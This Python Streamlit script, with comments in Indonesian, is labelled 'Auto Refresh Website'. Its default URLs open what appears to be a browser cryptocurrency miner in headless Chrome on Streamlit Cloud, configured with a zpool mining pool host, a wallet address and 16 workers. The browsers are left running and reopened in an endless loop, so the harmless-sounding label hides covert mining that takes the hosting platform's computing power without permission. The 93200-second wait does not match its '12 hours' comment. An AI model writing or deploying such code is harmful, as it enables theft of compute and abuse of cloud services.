import streamlit as st
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import WebDriverException
import time
import logging

# Konfigurasi logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def open_website(url):
    chrome_options = Options()
    # Pengaturan untuk Streamlit Cloud
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.binary_location = "/app/.apt/usr/bin/google-chrome"

    # Inisialisasi WebDriver
    try:
        driver = webdriver.Chrome(options=chrome_options)
    except WebDriverException as e:
        logging.error(f"Gagal inisialisasi WebDriver: {e}")
        return

    # Buka situs web
    try:
        driver.get(url)
        logging.info(f"Berhasil membuka website: {url}")

        # Menampilkan judul halaman (opsional)
        st.write(f"Judul Halaman: {driver.title}")
        
        # Menampilkan tangkapan layar (opsional)
        #screenshot = driver.get_screenshot_as_png()
        #st.image(screenshot, caption=f"Screenshot dari {url}")

    except WebDriverException as e:
        logging.error(f"Gagal membuka website: {url}. Error: {e}")
    #finally:
        #driver.quit()  # Selalu tutup driver setelah selesai

# Streamlit App
st.title("Auto Refresh Website")

# URL situs web yang ingin dibuka
url1 = st.text_input("Masukkan URL 1:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16")
url2 = st.text_input("Masukkan URL 2:", "https://nucleuser.com.mamida-rwl.sch.id?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RTtrydymx5kasjL7sTEnUWctqWHhSE1W7i&password=c%3DRVN&workers=16")

# Tombol untuk memulai proses
if st.button("Mulai"):
    while True:
        open_website(url1)
        open_website(url2)
        time.sleep(93200)  # Tunggu 12 jam
